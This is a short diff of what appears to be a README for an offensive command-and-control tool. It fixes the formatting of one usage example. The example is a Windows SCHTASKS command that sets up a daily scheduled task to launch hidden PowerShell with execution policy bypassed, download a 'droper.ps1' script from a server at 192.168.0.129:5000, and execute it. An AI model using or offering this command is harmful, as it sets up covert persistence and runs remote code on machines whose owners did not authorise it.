@@ -129,8 +129,7 @@ Mjollnir > list
 
 Then for example set a scheduled task like:
 ```
-CMD SCHTASKS /CREATE /SC DAILY /TN "MyTasks\my task" /TR "powershell.exe -ep bypass -w 1 -nop $e=(New-Object System.Net.WebClient).DownloadString(\\\"http://192.168.0.129:5000/publi
-c/droper.ps1\\\");IEX $e" /ST 9:21
+CMD SCHTASKS /CREATE /SC DAILY /TN "MyTasks\my task" /TR "powershell.exe -ep bypass -w 1 -nop $e=(New-Object System.Net.WebClient).DownloadString(\\\"http://192.168.0.129:5000/public/droper.ps1\\\");IEX $e" /ST 9:21
 ```
 
 # Group task
